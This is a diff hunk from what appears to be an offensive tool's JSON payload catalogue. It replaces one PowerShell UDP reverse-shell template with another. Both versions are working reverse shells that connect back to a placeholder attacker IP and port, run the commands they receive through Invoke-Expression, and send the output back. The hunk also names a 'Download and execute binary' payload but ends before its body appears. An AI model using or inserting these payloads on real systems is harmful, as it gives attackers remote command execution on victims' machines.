@@ -2,7 +2,7 @@
   "payloads": [
     {
       "payload_name": "UDP reverse shell",
-      "payload_template": "$ip = ''{{IP}}'';$port = {{PORT}};$s = ''shell>'';$udpClient = new-object net.sockets.udpclient(0);$ready = [text.encoding]::ascii.getbytes($s); $udpClient.send($ready, $ready.length, $ip, $port); $ipep = new-object net.ipendpoint([net.ipaddress]::any, 0); ;while (1) { $command = [text.encoding]::UTF8.getstring($udpClient.receive([ref]$ipep)); $commandOutput = $(Invoke-Expression $command); $responseLength = [text.encoding]::UTF8.getbytes($commandOutput).length; if ($responseLength -notlike 0) { $udpClient.send([text.encoding]::UTF8.getbytes($commandOutput), $responseLength, $ip, $port); }} ;$udpClient.close();"
+      "payload_template": "$e = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse(''{{IP}}''),{{PORT}}); $client = New-Object System.Net.Sockets.UDPClient; [byte[]]$bytes = 0..255|%{0}; $sendbytes = ([text.encoding]::ASCII).GetBytes(''PS '' + (Get-Location).Path + ''>'');    $client.Send($sendbytes,$sendbytes.Length,$e); while($true) { $receivebytes = $client.Receive([ref]$e); $returndata = ([text.encoding]::ASCII).GetString($receivebytes); $result = (Invoke-Expression -Command $returndata 2>&1 | Out-String ); $sendback = $result +  ''PS '' + (Get-Location).Path + ''> ''; $x = ($error[0] | Out-String); $error.clear(); $sendback2 = $sendback + $x; $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback2); $client.Send($sendbytes,$sendbytes.Length,$e)};$client.Close();"
     },
     {
       "payload_name": "Download and execute binary",
